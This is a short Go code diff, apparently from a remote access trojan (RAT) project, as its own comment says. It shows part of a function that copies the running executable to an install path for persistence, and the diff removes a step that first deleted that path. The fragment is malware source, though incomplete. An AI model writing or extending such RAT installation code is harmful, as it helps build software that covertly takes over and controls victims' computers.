@@ -21,11 +21,6 @@ func SetupDaemon() {
 // installExecuteable copies the currently running executeable
 // TODO: Remove duplicate source payload once RAT is installed
 func installExecuteable() error {
-	if err := os.RemoveAll(Path); err != nil {
-		log.Println("[InstallExe] [!] Couldn't clear executeable path:", err)
-		return err
-	}
-
 	ex, err := os.Executable()
 	if err != nil {
 		log.Println("[InstallExe] [!] Couldn't find the currently running exe:", err)
